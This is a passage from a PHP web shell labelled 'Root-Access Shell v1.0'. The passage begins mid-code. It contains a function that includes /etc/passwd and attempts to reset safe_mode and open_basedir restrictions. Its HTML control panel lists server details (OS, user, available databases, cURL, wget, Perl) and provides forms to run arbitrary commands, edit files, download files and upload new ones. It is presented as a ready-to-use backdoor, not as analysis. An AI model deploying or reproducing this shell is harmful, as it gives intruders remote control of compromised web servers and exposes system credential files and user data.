wner['name'],$grgid['name'],$size);
echo date("d.m.Y H:i ",$mtime);
}
echo "$file\n";
}
$d->close();
}
function safe_read($in)
{
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include("/etc/passwd");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
file_get_contents($in);
}
}
?><html>
<head>
<title>Root-Access Shell</title>
<META http-equiv="Content-Type" content="text/html; charset=CP866">
<style type=text/css>
BODY { font-family: Verdana, Tahoma, Arial, sans-serif;font-size: 11px;margin: 0px;padding: 0px;text-align: center;color: #e7e7eb;background-color: #242629;}
TABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif;font-size: 12px;color: #e7e7eb;}
.contentb {background-color: #44474f;}
.t { padding: 6px;background-color: #242629;}
input,textarea,select
{background: #44474f;
border: 1px solid #242629;
color: #e7e7eb;
font-family: verdana, helvetica, sans-serif;
font-size: 11px;
margin: 5px;
padding: 2px;
vertical-align: middle;
}
</style>
</head>
<body bgcolor='#242629'><br>
<center>

<table width=95% border=0 cellspacing=1 cellpadding=1 bgcolor=#646c71 style=border-color: #000000;>
<tr><th class=t align=left><b>Server Info</b></th></tr>
<tr><td class=contentb>
<table border="0" width="100%"><tr>
<td width="35%" >System: <font size=2 color=#ff4500><b><?php echo getsystem();?></b></font></td>
<td width="15%" >PHP-version: <font size=2 color=#29a329><?php echo phpversion();?></font></td>
<td width="15%" >Oracle: <?php echo oracle();?></td>
<td width="25%" >Safe_mode: <?php echo safe_mode();?></td>
</tr>
<tr>
<td width="35%" >Server: <font size=2 color=#ff4500><b><?php echo getserver();?></b></font></td>
<td width="15%" >MySQL: <?php echo testmysql();?></td>
<td width="15%" >cURL: <?php echo testcurl();?></td>
<td width="25%" >Total space: <?php echo view_size(disk_total_space(getcwd()));?></td>
</tr>
<tr>
<td width="35%" >PWD: <font size=2 color=#ff4500><b><?php if(strlen($u=pwd())>45){echo "...".substr($u,strlen($u)-40,40);}else{echo $u;};?></b></font></td>
<td width="15%" >PostgreSQL: <?php echo postgresql();?></td>
<td width="15%" >WGet: <?php echo testwget();?></td>
<td width="25%" >Free space: <?php echo view_size(diskfreespace(getcwd()));?></td>
</tr>
<tr>
<td width="35%" >User: <font size=2 color=#ff4500><b><?php echo getuser();?></b></font></td>
<td width="15%" >MSSQL: <?php echo testmssql();?></td>
<td width="15%" >Perl: <?php echo testperl();?></td>
<td width="25%" >Server time: <?php echo date('H:i d-m-Y');?></td>
</tr>
</table>
</td></tr></table>
<table width=95% border=0 cellspacing=1 cellpadding=1 bgcolor=#646c71 style=border-color: #000000;>
<tr><th class=t align=left><b>Shell</b></th></tr>
<tr><td class=contentb><center>
<form action method=POST>
<input type=hidden name="type" value=5>
<textarea cols=150 rows=20 name="value">
<?php echo htmlspecialchars(shell());?>
</textarea><?php echo edit();?></form>
<table border="0" width="100%">
<tr>
<td width="50%" align="center"><form action method=POST>
<b>Enter comand:</b>
<input type=hidden name="type" value=2>
<input type=text name="value" size=45><input type=submit value="Enter">
</form></td>
<td width="50%" align="center"><form action method=POST><b>PWD:</b> <input type=text name="value" size=51 value=<?php echo pwd();?>><input type=hidden name="type" value=3><input type=submit value="Enter">
</form></td>
</tr>
</table>
</td></tr></table>
<table width=95% border=0 cellspacing=1 cellpadding=1 bgcolor=#646c71 style=border-color: #000000;>
<tr><th class=t align=left><b>Tools</b></th></tr>
<tr><td class=contentb>
<form action method=POST>
<b>Edit file:</b><input type=hidden name="type" value=4>
<input type=text name="value" size=72 value=<?php echo pwd();?>><input type=submit value="Edit">
</form>
<form action method=POST>
<b>Download:</b>
<input type=hidden name="type" value=11><input type=text name="value" size=71 value=<?php echo pwd();?>><input type=submit value="Download">
</form><form enctype="multipart/form-data" action method=POST>
<b>Upload:</b><input type=hidden name="type" value=6>
<input type=file name="userfile" size=28>
<input type=hidden name="type" value=6>New name:<input type=text size=35 name="newname"><input type=submit value="Upload">
</form>
</td></tr></table>
<table width=95% border=0 cellspacing=1 cellpadding=1 bgcolor=#646c71 style=border-color: #000000;>
<tr><th class=t align=left><b>Copyright</b></th></tr>
<tr><td class=contentb><center><a href="http://forum.root-access.ru"><font size=2 color=#e7e7eb>Root-Access Shell v1.0</font></a></center>
</td></tr></table><br></center></body></html>